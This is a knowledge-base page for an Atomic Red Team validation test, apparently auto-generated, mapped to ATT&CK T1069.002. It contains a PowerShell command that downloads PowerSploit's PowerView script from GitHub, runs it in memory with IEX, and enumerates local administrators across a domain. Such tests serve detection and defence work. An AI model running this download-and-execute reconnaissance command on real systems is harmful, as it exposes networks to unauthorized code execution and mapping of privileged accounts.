---
atomic_guid: "a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd"
title: "Find local admins on all machines in domain (PowerView)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1069.002"
attack_technique_name: "Permission Groups Discovery: Domain Groups"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd"
  - "Find local admins on all machines in domain (PowerView)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Find local admins on all machines in domain (PowerView)

Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.

## Metadata

- Atomic GUID: a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd
- Technique: T1069.002: Permission Groups Discovery: Domain Groups
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1069.002/T1069.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1069-permission_groups_discovery|T1069.002]]

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.yaml)
